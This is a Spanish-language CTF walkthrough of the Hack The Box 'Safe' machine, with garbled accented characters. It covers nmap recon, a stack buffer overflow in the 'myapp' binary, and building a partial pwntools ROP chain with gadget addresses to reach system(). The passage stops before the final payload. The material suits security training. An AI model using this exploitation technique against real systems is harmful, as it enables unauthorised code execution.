I"Ñ©<p>Hoy vamos a resolver la m√°quina <em>Safe</em> de <em>Hack The Box</em>. Es una m√°quina <em>Linux</em> de nivel de dificultad media en la intrusi√≥n, y media en la escalada de privilegios seg√∫n figura en la plataforma.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/1.png" alt="" /></p>

<h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>

<p>Primeramente vamos a lanzar una <em>traza ICMP</em> para saber si la m√°quina est√° activa.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.147
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/2.png" alt="" /></p>

<p>Una vez comprobamos que la m√°quina est√° activa (pues nos devuelve una respuesta), podemos tambi√©n determinar a que tipo de m√°quina nos estamos enfrentando en base al valor del <em>TTL</em>; en este caso el valor del <em>TTL</em> de la m√°quina es <code class="language-plaintext highlighter-rouge">63</code>, por lo que podemos intuir que estamos ante una m√°quina <em>Linux</em>. Recordemos que algunos de los valores referenciales son los siguientes:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Sistema Operativo (OS)</th>
      <th style="text-align: left">TTL</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">Linux</td>
      <td style="text-align: left">64</td>
    </tr>
    <tr>
      <td style="text-align: left">Windows</td>
      <td style="text-align: left">128</td>
    </tr>
    <tr>
      <td style="text-align: left">Solaris</td>
      <td style="text-align: left">254</td>
    </tr>
  </tbody>
</table>

<p>Si nos damos cuenta, en esta ocasi√≥n, el valor del <em>TTL</em> es <code class="language-plaintext highlighter-rouge">63</code> y no <code class="language-plaintext highlighter-rouge">64</code> como indica la tabla anterior, esto se debe a que en el entorno de m√°quinas de <em>Hack The Box</em>, no nos comunicamos directamente con la m√°quina a vulnerar, sino que existe un intermediario, por lo que el <em>TTL</em> disminuye en una unidad.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.147 -R                               
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/3.png" alt="" /></p>

<p>Posteriormente, vamos a utilizar la herramienta <em>Nmap</em> para determinar que puertos est√°n abiertos, as√≠ como identificar la versi√≥n y servicios que corren en el activo. Para determinar que puertos est√°n abiertos podemos realizar lo siguiente:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.147
</code></pre></div></div>

<p>Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.147
</code></pre></div></div>

<p>A continuaci√≥n se explican los par√°metros utilizados en el escaneo de puertos con <em>Nmap</em>:</p>

<ul>
  <li>p - Escanea todo el rango de puertos (65535 en total)</li>
  <li>open - Nos indica todos aquellos puertos que est√°n abiertos (o posiblemente abiertos)</li>
  <li>T5 - La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, ‚Äúgeneraremos m√°s ruido‚Äù, pero no pasa nada ¬øno? Al fin y al cabo estamos practicando en un entorno controlado y aqu√≠ somos todos <code class="language-plaintext highlighter-rouge">White Hat</code></li>
  <li>v - <em>Verbose</em>, reporta lo encontrado por consola</li>
  <li>n - No aplicar <em>resoluci√≥n DNS</em></li>
  <li>sS - Escaneo <em>TCP SYN</em></li>
  <li>min-rate - Emitir paquetes no m√°s lentos que &lt;valor&gt; por segundo</li>
  <li>vvv - Triple <em>verbose</em>, para obtener mayor informaci√≥n por consola</li>
  <li>Pn - No aplicar <em>host discovery</em></li>
</ul>

<p>Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versi√≥n y servicios que corren bajo estos puertos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 22,80,1337 10.10.10.147
</code></pre></div></div>

<p>A continuaci√≥n se explican los par√°metros utilizados en el escaneo de versiones y servicios con <em>Nmap</em>:</p>

<ul>
  <li>sC - Scripts b√°sicos de enumeraci√≥n</li>
  <li>sV - Versi√≥n y servicios que corren bajo los puertos encontrados</li>
  <li>p - Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)</li>
</ul>

<p>Bas√°ndonos en la informaci√≥n que nos reporta <em>Nmap</em>, podemos darnos cuenta que la m√°quina v√≠ctima tiene abierto un puerto relacionado con <code class="language-plaintext highlighter-rouge">HTTP</code>; asimismo, encontramos abierto el puerto <code class="language-plaintext highlighter-rouge">1337</code>, relacionado con el protocolo <code class="language-plaintext highlighter-rouge">WASTE</code>, el cual permite el intercambio de archivos de forma cifrada.</p>

<p>Debido a que la m√°quina cuenta con el puerto <code class="language-plaintext highlighter-rouge">80</code> abierto, podr√≠amos intentar aplicar <code class="language-plaintext highlighter-rouge">fuzzing</code>, no obstante, no vamos a encontrar nada interesante.</p>

<p>Lo siguiente que podemos hacer es determinar ante que nos estamos enfrentando, para ello podemos hacer uso de <code class="language-plaintext highlighter-rouge">WhatWeb</code>, herramienta que se encarga de identificar que tecnolog√≠as web se est√°n empleando, v√©ase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se est√° utilizando para alojar el servidor web.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://10.10.10.147
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/4.png" alt="" /></p>

<p>Como podemos observar, no hay nada especialmente relevante a excepci√≥n del t√≠tulo de la p√°gina, el cual es el mensaje por defecto que aparece cuando montamos una p√°gina web haciendo uso del servidor <code class="language-plaintext highlighter-rouge">Apache</code>, por lo que podemos irnos haciendo a la idea, de que la entrada a la m√°quina, no ser√° v√≠a web.</p>

<p>En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas p√°ginas desde nuestro navegador.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/5.png" alt="" /></p>

<p>En efecto, lo primero que vemos al abrir la p√°gina web, es la p√°gina por defecto que viene cuando montamos una p√°gina web mediante el servidor <code class="language-plaintext highlighter-rouge">Apache</code>, por lo que, podemos inspeccionar el c√≥digo fuente, en busca de alguna pista; para verlo de manera m√°s c√≥moda podemos hacer <code class="language-plaintext highlighter-rouge">Ctrl + U</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/6.png" alt="" /></p>

<p>Si nos percatamos, en las primeras l√≠neas del c√≥digo fuente, hay un comentario que nos menciona que <code class="language-plaintext highlighter-rouge">myapp</code>, alojado en el puerto <code class="language-plaintext highlighter-rouge">1337</code>, lo podemos descargar; para ello, podemos intentar a√±adir <code class="language-plaintext highlighter-rouge">/myapp</code>, al final del url.</p>

<p><em>Los comentarios en HTML, siempre tienen la siguiente estructura:</em></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!-- Este es un comentario a modo de prueba --&gt;
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/7.png" alt="" /></p>

<p>Al a√±adir <code class="language-plaintext highlighter-rouge">/myapp</code>, al final del url, se nos va a descargar un archivo que lleva por nombre, <code class="language-plaintext highlighter-rouge">myapp</code>, el cual vamos a empezar a analizar.</p>

<h3 id="fase-de-explotaci√≥n"><a href="#header-3"></a>Fase De Explotaci√≥n</h3>

<p>Lo primero que debemos hacer, es saber que es <code class="language-plaintext highlighter-rouge">myapp</code>, para ello podemos usar el comando <code class="language-plaintext highlighter-rouge">file</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file myapp
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/8.png" alt="" /></p>

<p>Nos damos cuenta de que el archivo <code class="language-plaintext highlighter-rouge">myapp</code>, es un binario, por lo que procederemos a darle permisos de ejecuci√≥n para saber qu√© hace:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod 744 myapp
</code></pre></div></div>

<p><img src="http://0.0.0.0:80/9.png" alt="" /></p>

<p>Al ejecutar el binario <code class="language-plaintext highlighter-rouge">myapp</code>, nos reporta por consola la hora actual, adem√°s de imprimir el mismo mensaje que introduzcamos; esto no nos es de ayuda, por lo que podr√≠amos intentar extraer las cadenas de caracteres que se encuentran dentro del binario con el comando <code class="language-plaintext highlighter-rouge">strings</code>, sin embargo, no hay nada interesante.</p>

<p>Lo siguiente que podr√≠amos intentar, ser√≠a realizar un <code class="language-plaintext highlighter-rouge">Buffer Overflow</code>, para ello, cu√°ndo el binario <code class="language-plaintext highlighter-rouge">myapp</code>, nos pregunte por una cadena de caracteres, debemos ingresar una que sea bastante larga.</p>

<p>Una manera r√°pida con la cual podemos conseguir cadenas de caracteres cuan largas queramos, ser√≠a haciendo uso de <code class="language-plaintext highlighter-rouge">Python</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'print "A"*365'</span>
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/10.png" alt="" /></p>

<p>Si nos percatamos, al introducir nuestra cadena de <em>365 letras A</em>, el binario <code class="language-plaintext highlighter-rouge">myapp</code>, deja de funcionar como deber√≠a, esto se debe a un <code class="language-plaintext highlighter-rouge">Segmentation Fault</code> (<em>Fallo de Segmentaci√≥n</em>), los cuales se dan cuando empezamos a sobrescribir registros. Ahora, ¬øpor qu√© se est√°n sobrescribiendo algunos registros?</p>

<p>Cuando el programa <code class="language-plaintext highlighter-rouge">myapp</code>, nos pregunta por una cadena de caracteres, este almacena nuestra respuesta en un bloque de memoria, el <code class="language-plaintext highlighter-rouge">buffer</code>, el cual puede almacenar una cierta cantidad de bytes, la cual de momento desconocemos; si introducimos una cantidad de bytes mayor a la que el buffer estaba dise√±ado, el programa corrompe.</p>

<p>La pregunta ahora es, ¬øa d√≥nde se dirigen estos bytes que est√°n desbordando el <code class="language-plaintext highlighter-rouge">buffer</code>, acaso desaparecen? La respuesta es no, como mencion√©, empezamos a sobrescribir registros, de modo que los bytes siguientes a la cantidad m√°xima de bytes que soporta el buffer, se dirigen al siguiente valor de memoria, y as√≠ sucesivamente.</p>

<p>El concepto de <code class="language-plaintext highlighter-rouge">Buffer Overflow</code> puede parecer complejo en un inicio, pero es mucho m√°s f√°cil de asimilarlo cuando lo visualizamos; para ello, haremos uso de <code class="language-plaintext highlighter-rouge">GDB</code>, herramienta que nos permitir√° depurar el binario <code class="language-plaintext highlighter-rouge">myapp</code>. Concretamente estar√© haciendo uso de <code class="language-plaintext highlighter-rouge">GEF</code> (<em>GDB Enhanced Features</em>), el cual es una extensi√≥n para GDB, as√≠ como lo es <code class="language-plaintext highlighter-rouge">PEDA</code> (<em>Python Exploit Development Assistance</em>).</p>

<p>Si queremos instalar <code class="language-plaintext highlighter-rouge">GEF</code>, podemos seguir las instrucciones dadas por la <a href="https://gef.readthedocs.io/en/master/#setup">p√°gina oficial</a>, no obstante, en mi caso, esto no me funcion√≥, por lo que tuve que realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip3 install capstone unicorn keystone-engine ropper

wget https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/gefInstall.sh
chmod 744 gefInstall.sh
./gefInstall.sh
rm gefInstall.sh
</code></pre></div></div>

<p>Ya con <code class="language-plaintext highlighter-rouge">GEF</code> instalado podemos empezar a depurar el binario <code class="language-plaintext highlighter-rouge">myapp</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb myapp

run
</code></pre></div></div>

<p><img src="http://0.0.0.0:80/11.png" alt="" /></p>

<p><img src="http://0.0.0.0:80/12.png" alt="" /></p>

<p>Algo importante a mencionar, antes de empezar el an√°lisis con <code class="language-plaintext highlighter-rouge">GEF</code>, es que la arquitectura del sistema ante el que nos estamos enfrentando a la hora de explotar <code class="language-plaintext highlighter-rouge">Buffer Overflow</code>, tiene bastante relevancia; en este caso concreto, nos estamos enfrentando ante una m√°quina de <code class="language-plaintext highlighter-rouge">64 bits</code>, y esto lo podemos saber ya que el nombre de los registros empieza por ‚ÄòR‚Äô (<em>RBP, RSP, RIP</em>), en caso de que el sistema fuera de <code class="language-plaintext highlighter-rouge">32 bits</code>, el nombre de los registros empezar√≠a por ‚ÄòE‚Äô (<em>EBP, ESP, EIP</em>), no obstante, independientemente de la arquitectura, estos registros se refieren a lo mismo.</p>

<p>Para explotar un <code class="language-plaintext highlighter-rouge">Buffer Overflow</code> satisfactoriamente, existen dos requisitos indispensables, el primero es sobrescribir el registro <em>RIP</em> o <em>EIP</em> (seg√∫n corresponda), ya que este, apunta a la direcci√≥n siguiente a ejecutar, por lo que nos interesa como atacantes redirigir el flujo del programa, a nuestro antojo, cabe aclarar que la direcci√≥n introducida debe de existir dentro del programa, caso contrario, este corromper√° como lo est√° haciendo ahora mismo; el segundo requisito se refiere a, de qu√© manera vamos a sobrescribir el registro <code class="language-plaintext highlighter-rouge">RIP</code>, para ello debemos calcular su <em>offset</em>.</p>

<p>Sobre el mensaje <em>Cannot disassemble from $PC</em>, veremos una peque√±a flecha que nos indica en que secci√≥n, el programa dej√≥ de funcionar, en este caso es en una funci√≥n de retorno que apunta hacia el registro <code class="language-plaintext highlighter-rouge">RSP</code>, el cual, si nos percatamos, est√° lleno de <em>letras A</em>; nuestro objetivo ahora, es determinar despu√©s de cu√°ntos bytes, empezaremos a sobrescribir el registro <code class="language-plaintext highlighter-rouge">RSP</code>.</p>

<p>Haciendo uso de <code class="language-plaintext highlighter-rouge">GEF</code>, esto es bastante sencillo, ya que lo har√° por nosotros, por lo que debemos realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb myapp

pattern create
run
pattern offset $rsp
</code></pre></div></div>

<p><img src="http://0.0.0.0:80/13.png" alt="" /></p>

<p><img src="http://0.0.0.0:80/14.png" alt="" /></p>

<p>Sabemos ahora que, despu√©s de ingresar <em>120 bytes</em>, empezaremos a sobrescribir el registro <code class="language-plaintext highlighter-rouge">RSP</code>, y esto lo podemos comprobar de manera sencilla, intentando ingresar en este registro, <em>8 letras B</em>, por ejemplo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'print "A"*120 + "B"*8'</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb myapp

run
</code></pre></div></div>

<p><img src="http://0.0.0.0:80/15.png" alt="" /></p>

<p><img src="http://0.0.0.0:80/16.png" alt="" /></p>

<p>En efecto, al ingresar <em>120 bytes</em>, empezamos a sobrescribir el <code class="language-plaintext highlighter-rouge">RSP</code>, ya con esto en mente, debemos verificar que est√°ndares de seguridad se est√°n aplicando sobre el binario, para as√≠ determinar que metodolog√≠a emplearemos para explotarlo; para conocer que seguridades se est√°n aplicando, haremos uso de <code class="language-plaintext highlighter-rouge">checksec</code>, esto podemos hacerlo tanto dentro de <code class="language-plaintext highlighter-rouge">GEF</code>, como fuera de √©l.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb myapp

checksec
</code></pre></div></div>

<p><img src="http://0.0.0.0:80/17.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>checksec myapp
</code></pre></div></div>

<p><img src="http://0.0.0.0:80/18.png" alt="" /></p>

<p>Podemos observar que el <code class="language-plaintext highlighter-rouge">DEP</code> (<em>Data Execution Prevention</em>), o <code class="language-plaintext highlighter-rouge">NX</code> (<em>No-Execute</em>), est√° activado; esta protecci√≥n nos impedir√° ejecutar c√≥digo a trav√©s del <em>stack</em>, por lo que no tendr√° sentido redirigir el flujo del programa por ah√≠, por lo que debemos ver, de qu√© manera, haciendo uso de las mismas posibilidades que nos ofrece el binario <code class="language-plaintext highlighter-rouge">myapp</code>, podemos explotarlo, a este concepto se lo conoce como <code class="language-plaintext highlighter-rouge">ROP</code> (<em>Return Oriented Programming</em>).</p>

<p>Ya en este punto, sabido lo que tenemos que hacer, podemos empezar a aplicar <em>ingenier√≠a inversa</em> sobre el binario, para hacerlo, haremos uso de <code class="language-plaintext highlighter-rouge">Ghidra</code>, una suite de herramientas dedicada a la <em>ingenier√≠a inversa</em>, desarrollada por la <em>NSA</em>.</p>

<p>Para descargar <code class="language-plaintext highlighter-rouge">Ghidra</code>, ingresaremos <a href="https://github.com/NationalSecurityAgency/ghidra/releases">aqu√≠</a>, y descargaremos la versi√≥n m√°s reciente.</p>

<p><img src="http://0.0.0.0:80/19.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unzip &lt;archivoQueHayamosDescargado&gt;
cd &lt;carpetaQueSeHayaCreado&gt;
./ghidraRun
</code></pre></div></div>

<p>Presionaremos <em>File</em>, <em>New Project</em>, <em>Non-Shared Project</em>, elegiremos un espacio de trabajo, le damos un nombre a nuestro proyecto, presionamos <em>File</em>, <em>Import File</em>, seleccionamos el binario <code class="language-plaintext highlighter-rouge">myapp</code>, arrastramos el binario que acabamos de importar hacia el drag√≥n, y finalmente aceptamos analizar.</p>

<p><img src="http://0.0.0.0:80/20.png" alt="" /></p>

<p>Ya en este punto podemos empezar a analizar que hay dentro del binario <code class="language-plaintext highlighter-rouge">myapp</code>, por ejemplo, podemos analizar que funciones est√°n definidas, para ello, desplegaremos el men√∫ <em>Functions</em>, que se encuentra al lado izquierdo, podemos empezar por analizar la funci√≥n <code class="language-plaintext highlighter-rouge">main</code>.</p>

<p><img src="http://0.0.0.0:80/21.png" alt="" /></p>

<p>Si nos percatamos, esto es lo que encontramos cuando ejecutamos <code class="language-plaintext highlighter-rouge">myapp</code>; nos damos cuenta de que se est√° definiendo una variable de nombre <code class="language-plaintext highlighter-rouge">local_78</code> que acepta una cierta cantidad de bytes, concretamente, 112, la cual almacena la cadena de caracteres que nos pide ingresar, para posteriormente, volver a mostrarla por pantalla, adicionalmente, se est√° ejecutando una llamada al sistema para ejecutar el comando <code class="language-plaintext highlighter-rouge">uptime</code>.</p>

<p>Podemos observar dos cosas interesantes, por un lado, se est√° haciendo uso de la funci√≥n <code class="language-plaintext highlighter-rouge">gets()</code>, una funci√≥n considerada insegura, debido principalmente a que esta, no verifica la longitud del buffer, raz√≥n por la cual, podemos desbordarlo. Por otra parte, nos damos cuenta de que se est√° haciendo una llamada al sistema, algo que llama nuestra atenci√≥n, ya que si logr√°ramos introducir un comando diferente a <code class="language-plaintext highlighter-rouge">uptime</code>, podr√≠amos conseguir una consola dentro de la m√°quina v√≠ctima.</p>

<p>Pero, ¬øc√≥mo introducimos un comando si el programa ya est√° compilado? La respuesta est√° en la funci√≥n <code class="language-plaintext highlighter-rouge">test</code>, y el concepto de <code class="language-plaintext highlighter-rouge">ROP</code>.</p>

<p>No obstante, vamos a analizar el binario <code class="language-plaintext highlighter-rouge">myapp</code>, una vez m√°s, con la diferencia de que vamos a empezar a automatizar lo que vamos a hacer, pues ya tenemos una idea clara de por donde van los tiros. Para ello, podemos crear un script en <code class="language-plaintext highlighter-rouge">Python</code>, para lo cual empezaremos por colocar la cabecera de <code class="language-plaintext highlighter-rouge">Python 3</code>, importar la librer√≠a <code class="language-plaintext highlighter-rouge">pwntools</code>, y definir tanto la <em>arquitectura</em> como el <em>sistema operativo</em> de la m√°quina v√≠ctima, adicionalmente, podemos definir que tipo de terminal queremos emplear para poder trabajar m√°s a gusto.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'gnome-terminal'</span><span class="p">,</span> <span class="s">'-x'</span><span class="p">]</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
</code></pre></div></div>

<p>En caso de no contar con la librer√≠a <code class="language-plaintext highlighter-rouge">pwntools</code>, podemos hacer lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
</code></pre></div></div>

<p>Una vez definida la base del script, podemos empezar a trabajar. Nos interesa saber en que registro, se est√° almacenando el comando <code class="language-plaintext highlighter-rouge">uptime</code>, para lo cual, empezaremos por definir un proceso, el cual ser√° la depuraci√≥n del binario, a√±adiremos un <em>breakpoint</em> en la direcci√≥n donde se hace la llamada al sistema, y, adicional a ello, indicaremos al script que nos espere hasta escribir algo despu√©s de <em>What do you want me to echo back?</em>, caso contrario, el script se cerrar√°.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">'ubicaci√≥n/del/binario/myapp'</span><span class="p">,</span> <span class="s">'b *0x40116e'</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"What do you want me to echo back?"</span><span class="p">)</span>
</code></pre></div></div>

<p>La direcci√≥n de la llamada al sistema, la podemos sacar de <code class="language-plaintext highlighter-rouge">Ghidra</code>:</p>

<p><img src="http://0.0.0.0:80/22.png" alt="" /></p>

<p>Ejecutamos nuestro script, no sin antes haberle asignado los permisos correspondientes:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod 744 &lt;nuestroScript.py&gt;
</code></pre></div></div>

<p>En este punto podemos presionar la tecla <code class="language-plaintext highlighter-rouge">c</code>, para continuar, y nos daremos cuenta que el comando <code class="language-plaintext highlighter-rouge">uptime</code>, est√° siendo almacenado en el registro <code class="language-plaintext highlighter-rouge">RDI</code>.</p>

<p><img src="http://0.0.0.0:80/23.png" alt="" /></p>

<p>En este punto, tenemos que buscar una forma de sobrescribir el registro <code class="language-plaintext highlighter-rouge">RDI</code>, y la clave est√° en la funci√≥n <code class="language-plaintext highlighter-rouge">test</code></p>

<p><img src="http://0.0.0.0:80/24.png" alt="" /></p>

<p>Si nos percatamos, en la direcci√≥n <code class="language-plaintext highlighter-rouge">0x401156</code>, el contenido que se encuentra en el registro <code class="language-plaintext highlighter-rouge">RSP</code>, est√° siendo almacenado en el registro <code class="language-plaintext highlighter-rouge">RDI</code>; ¬øcu√°ndo almacen√°bamos las <em>8 letras B</em>, en qu√© registro las est√°bamos almacenando? Exacto, en <code class="language-plaintext highlighter-rouge">RSP</code>, por lo que ahora, debemos de buscar una forma en la que poder redirigir el flujo del programa a trav√©s de la funci√≥n <code class="language-plaintext highlighter-rouge">test</code>, para que cuando esta termine, podamos ejecutar el comando que deseemos.</p>

<p>Sin embargo, hay un peque√±o problema, en la siguiente instrucci√≥n, <code class="language-plaintext highlighter-rouge">0x401159</code>, se est√° efectuando un <em>jump</em> a <code class="language-plaintext highlighter-rouge">R13</code>, el cual apunta a una direcci√≥n que no nos interesa, por lo que tambi√©n debemos de hallar una forma en la que inyectar la direcci√≥n en la que se efect√∫a la llamada al sistema, de modo que as√≠, a la llamada al sistema, le estamos pasando como argumento nuestro c√≥digo malicioso definido en <code class="language-plaintext highlighter-rouge">RDI</code>.</p>

<p>La pregunta ahora es, ¬øde qu√© manera inyectamos la direcci√≥n de la llamada al sistema, en <code class="language-plaintext highlighter-rouge">R13</code>? Esto lo haremos haciendo uso de <code class="language-plaintext highlighter-rouge">gadgets</code>, los cuales no son m√°s que instrucciones de la CPU, ya definidas dentro del programa.</p>

<p>Haciendo uso de nuestro script, escribiremos ahora <code class="language-plaintext highlighter-rouge">ropper</code>, lo cual nos permitir√° listar todos los <code class="language-plaintext highlighter-rouge">gadgets</code> dentro del binario.</p>

<p><img src="http://0.0.0.0:80/25.png" alt="" /></p>

<p>Vemos que se nos lista un total de <em>99 gadgets</em>, de los cuales nos interesa <code class="language-plaintext highlighter-rouge">pop</code>, ya que este nos permite cargar un valor en el registro al que est√© asignado, por lo que procederemos a listar que opciones tenemos con el <code class="language-plaintext highlighter-rouge">gadget pop</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ropper --search "pop"
</code></pre></div></div>

<p><img src="http://0.0.0.0:80/26.png" alt="" /></p>

<p>Observamos, que tenemos una opci√≥n que nos permite hacer un <code class="language-plaintext highlighter-rouge">pop</code> a <code class="language-plaintext highlighter-rouge">R13</code>, aunque esta va seguida de <code class="language-plaintext highlighter-rouge">pops</code> a otras direcciones, por lo que a estas, tendremos que asignarles valores nulos, ya que no nos interesan.</p>

<p>Ya con toda esta informaci√≥n, es posible finalmente, explotar el binario <code class="language-plaintext highlighter-rouge">myapp</code>, haciendo uso de <code class="language-plaintext highlighter-rouge">Buffer Overflow</code>, <code class="language-plaintext highlighter-rouge">Return Oriented Programming</code> y <code class="language-plaintext highlighter-rouge">gadgets</code>, por lo que regresaremos a nuestro script en <code class="language-plaintext highlighter-rouge">Python</code>.</p>

<p>Lo primero que vamos a hacer, es comentar o borrar la l√≠nea en la que aplic√°bamos un <em>breakpoint</em> a la llamada al sistema, ya que no la vamos a usar m√°s, esto mismo haremos con la l√≠nea del p.recvuntil(). Por otra parte, vamos a empezar por definir variables; la primera ser√° <code class="language-plaintext highlighter-rouge">popR13</code>, la cual va a valer la direcci√≥n en la que se aplica este <code class="language-plaintext highlighter-rouge">gadget</code>; la segunda ser√° <code class="language-plaintext highlighter-rouge">system</code>, la cual va a valer la direcci√≥n de la llamada al sistema; la tercera ser√° <code class="language-plaintext highlighter-rouge">test</code>, la cual va a valer la direcci√≥n de la funci√≥n <code class="language-plaintext highlighter-rouge">test</code>.</p>

<p>La direcci√≥n de la funci√≥n <code class="language-plaintext highlighter-rouge">test</code>, la podemos sacar de <code class="language-plaintext highlighter-rouge">Ghidra</code>:</p>

<p><img src="http://0.0.0.0:80/27.png" alt="" /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">popR13</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401206</span><span class="p">)</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40116e</span><span class="p">)</span>
<span class="n">test</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401152</span><span class="p">)</span>
</code></pre></div></div>

<p>Es importante tener en cuenta que, en todo momento, estamos trabajando en <code class="language-plaintext highlighter-rouge">64 bits</code>.</p>

<p>Por otra parte, vamos a empezar por definir el n√∫mero de <em>letras A</em> que queremos introducir, previo a desbordar el <code class="language-plaintext highlighter-rouge">buffer</code>, esto lo vamos a almacenar en una variable de nombre <code class="language-plaintext highlighter-rouge">junk</code>, eso si, deberemos de codificar la variable en formato bytes.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">junk</span> <span class="o">=</span> <span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">112</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span>
</code></pre></div></div>

<p>Si nos percatamos, estamos introduciendo <em>112 letras A</em>, y no <em>120</em>, porque ciertamente el <code class="language-plaintext highlighter-rouge">buffer</code> se desborda con <em>112 bytes</em>, como pudimos ver con <code class="language-plaintext highlighter-rouge">Ghidra</code>, no obstante, para poder empezar a sobrescribir registros tenemos que introducir <em>120 bytes</em> como vimos con <code class="language-plaintext highlighter-rouge">GEF</code>, pues estamos frente a un <em>sistema operativo</em> de <code class="language-plaintext highlighter-rouge">64 bits</code>, por lo que necesitamos de <code class="language-plaintext highlighter-rouge">8 bytes</code> para insertar un valor en el <code class="language-plaintext highlighter-rouge">stack</code>, en caso de estar en un sistema operativo de <code class="language-plaintext highlighter-rouge">32 bits</code>, necesitar√≠amos de <code class="language-plaintext highlighter-rouge">4 bytes</code>.</p>

